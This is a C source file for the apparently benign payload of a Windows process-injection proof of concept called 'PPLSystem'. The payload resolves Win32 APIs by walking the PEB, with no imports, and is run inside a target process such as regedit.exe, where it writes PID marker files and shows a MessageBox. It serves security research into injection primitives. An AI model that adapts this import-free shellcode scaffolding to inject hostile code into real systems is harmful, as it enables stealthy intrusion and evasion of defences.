/*
 * payload.c - benign proof-of-execution payload for the PPLSystem PoC.
 *
 * This is the unsigned code that gets mapped (as a SEC_IMAGE section) and then
 * executed inside the target process (regedit.exe by default). It only proves
 * that arbitrary code ran inside the target:
 *
 *   1. writes  C:\Users\Public\inject_proof.txt  containing the host PID, and
 *   2. pops a MessageBox.
 *
 * It is fully position-independent and resolves every Win32 API at runtime by
 * walking the PEB - there are NO imports, NO CRT, and NO base relocations to
 * process. Execution begins at `payload_main` (the linker entry point), which
 * the loader maps at `ImageBase + AddressOfEntryPoint`; `shellcode.exe` starts
 * the remote thread exactly there.
 *
 * Keep this harmless. It exists to demonstrate the injection primitive for
 * authorized security research / education - not to do anything in the target.
 */

#include "peb.h"

/*
 * Provide memset/memcpy so a /NODEFAULTLIB link never fails on a
 * compiler-emitted intrinsic call. The pragma forces real function bodies
 * (rather than intrinsic-only), giving the linker a symbol to resolve.
 */
#pragma function(memset, memcpy)
void *memset(void *dst, int val, size_t len) {
    unsigned char *p = (unsigned char *)dst;
    while (len--) *p++ = (unsigned char)val;
    return dst;
}
void *memcpy(void *dst, const void *src, size_t len) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (len--) *d++ = *s++;
    return dst;
}

/* ---- Function-pointer typedefs for the APIs we resolve at runtime -------- */
typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE  (WINAPI *fnCreateFileA)(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
typedef BOOL    (WINAPI *fnCloseHandle)(HANDLE);
typedef DWORD   (WINAPI *fnGetCurrentProcessId)(void);
typedef int     (WINAPI *fnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);

/* Append the decimal form of `value` to `buf` at `*pos`; advance `*pos`. */
static void append_u32(char *buf, int *pos, DWORD value) {
    char tmp[16];
    int n = 0;
    if (value == 0) {
        buf[(*pos)++] = '0';
        return;
    }
    while (value > 0 && n < (int)sizeof(tmp)) {
        tmp[n++] = (char)('0' + (value % 10));
        value /= 10;
    }
    while (n > 0) {
        buf[(*pos)++] = tmp[--n];
    }
}

/* Compute the length of an ASCII string without the CRT. */
static int a_len(const char *s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

/* Write `data` to `path` (best effort). Path is passed as a literal so it is
   referenced RIP-relative - no pointer array, no relocations. */
static void write_proof(fnCreateFileA cf, fnWriteFile wf, fnCloseHandle cl,
                        const char *path, const char *data, int len) {
    HANDLE h = cf(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        wf(h, data, (DWORD)len, &written, NULL);
        if (cl) cl(h);
    }
}

void payload_main(void) {
    /* 1. Resolve kernel32!LoadLibraryA + GetProcAddress via the PEB. */
    PVOID k32 = pl_find_module("kernel32.dll");
    if (!k32) return;

    fnLoadLibraryA   pLoadLibraryA   = (fnLoadLibraryA)  pl_get_proc(k32, "LoadLibraryA");
    fnGetProcAddress pGetProcAddress = (fnGetProcAddress)pl_get_proc(k32, "GetProcAddress");
    if (!pLoadLibraryA || !pGetProcAddress) return;

    /* 2. Everything else through the resolved GetProcAddress. */
    fnCreateFileA         pCreateFileA   = (fnCreateFileA)        pGetProcAddress((HMODULE)k32, "CreateFileA");
    fnWriteFile           pWriteFile     = (fnWriteFile)          pGetProcAddress((HMODULE)k32, "WriteFile");
    fnCloseHandle         pCloseHandle   = (fnCloseHandle)        pGetProcAddress((HMODULE)k32, "CloseHandle");
    fnGetCurrentProcessId pGetPid        = (fnGetCurrentProcessId)pGetProcAddress((HMODULE)k32, "GetCurrentProcessId");

    DWORD pid = pGetPid ? pGetPid() : 0;

    /* 3. Build the proof message: "Injected into PID <pid>\r\n".
       Buffers are generously sized (max content ~30/45 bytes) - there is no
       stack cookie under /GS-, so we keep a wide margin. */
    char msg[96];
    int  mlen = 0;
    const char *prefix = "Injected into PID ";
    int i;
    for (i = 0; prefix[i]; i++) msg[mlen++] = prefix[i];
    append_u32(msg, &mlen, pid);
    msg[mlen++] = '\r';
    msg[mlen++] = '\n';

    /* 4. Write the on-disk proof marker to several locations (the target's
          token may not be able to write all of them). */
    if (pCreateFileA && pWriteFile) {
        write_proof(pCreateFileA, pWriteFile, pCloseHandle, "C:\\Users\\Public\\inject_proof.txt", msg, mlen);
        write_proof(pCreateFileA, pWriteFile, pCloseHandle, "C:\\Windows\\Temp\\inject_proof.txt", msg, mlen);
        write_proof(pCreateFileA, pWriteFile, pCloseHandle, "C:\\ProgramData\\inject_proof.txt", msg, mlen);
    }

    /* 5. Pop a visible proof MessageBox (user32 loaded on demand). */
    PVOID u32 = pLoadLibraryA("user32.dll");
    if (u32) {
        fnMessageBoxA pMessageBoxA = (fnMessageBoxA)pGetProcAddress((HMODULE)u32, "MessageBoxA");
        if (pMessageBoxA) {
            char boxtext[160];
            int  blen = 0;
            for (i = 0; msg[i] && msg[i] != '\r'; i++) boxtext[blen++] = msg[i];
            const char *tail = " (PPLSystem PoC)";
            for (i = 0; tail[i]; i++) boxtext[blen++] = tail[i];
            boxtext[blen] = 0;
            (void)a_len; /* silence unused in some builds */
            pMessageBoxA(NULL, boxtext, "PPLSystem PoC", 0 /*MB_OK*/);
        }
    }
}
